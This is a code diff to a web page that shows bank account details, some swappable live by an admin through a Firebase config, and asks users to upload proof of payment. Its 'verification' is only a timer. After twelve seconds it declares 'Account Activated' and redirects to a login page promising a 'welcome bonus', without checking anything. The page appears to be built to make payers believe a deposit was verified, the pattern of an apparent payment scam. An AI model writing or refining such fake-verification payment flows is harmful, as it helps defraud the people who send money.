@@ -204,10 +204,10 @@
         <div class="loader-ring"></div>
         <h3 class="mt-8 text-xl font-black text-[#b8d5b0] uppercase tracking-widest">Verifying</h3>
     </div>
-    <div id="success-content" class="hidden flex flex-col items-center text-center">
+    <div id="success-content" class="hidden flex flex-col items-center text-center px-4">
         <i class="fas fa-circle-check text-7xl text-[#b8d5b0] animate-bounce"></i>
-        <h3 class="mt-6 text-2xl font-black text-white uppercase tracking-widest">Confirmed</h3>
-        <p class="text-white/60 text-sm mt-2 font-bold uppercase tracking-widest">Redirecting...</p>
+        <h3 class="mt-6 text-2xl font-black text-white uppercase tracking-widest">Account Activated</h3>
+        <p class="text-white/60 text-sm mt-2 font-bold uppercase tracking-widest">Login to claim your welcome bonus</p>
     </div>
 </div>
 
@@ -249,7 +249,6 @@
             document.getElementById('account-name-display').innerText = data.holder;
             document.getElementById('display-amount').innerText = data.amount;
 
-            // ONLY OVERWRITE NIGERIA IF ADMIN HAS DATA
             if(selected === 'nigeria' && adminData) {
                 if(adminData.nigeriaBank) document.getElementById('bank-name-display').innerText = adminData.nigeriaBank;
                 if(adminData.nigeriaNumber) document.getElementById('db-number').innerText = adminData.nigeriaNumber;
@@ -260,18 +259,17 @@
     }
 
     async function initPage() {
-        setupUI(); // Load defaults first
+        setupUI();
         try {
             await signInAnonymously(auth);
             onSnapshot(doc(db, "configs", "main"), (snap) => {
-                if(snap.exists()) setupUI(snap.data()); // Live update Nigeria details
+                if(snap.exists()) setupUI(snap.data());
             });
         } catch(e) { console.error("Cloud Error:", e); }
     }
 
     window.onload = initPage;
 
-    // UI HANDLERS
     window.openUploadModal = () => document.getElementById('upload-modal').style.display = 'flex';
     window.closeUploadModal = () => document.getElementById('upload-modal').style.display = 'none';
     window.handleFileSelect = () => {
@@ -282,13 +280,17 @@
         }
     };
 
+    // UPDATED REDIRECT FOR YOUR FLOW
     window.startVerification = () => {
         closeUploadModal();
         document.getElementById('overlay').style.display = 'flex';
         setTimeout(() => {
             document.getElementById('loader-content').classList.add('hidden');
             document.getElementById('success-content').classList.remove('hidden');
-            setTimeout(() => { window.location.href = 'main-dashboard.html'; }, 3000);
+            setTimeout(() => { 
+                // POINTS TO LOGIN NOW
+                window.location.href = 'login.html'; 
+            }, 5000); // 5 seconds to read the "Login to claim bonus" message
         }, 12000);
     };
 
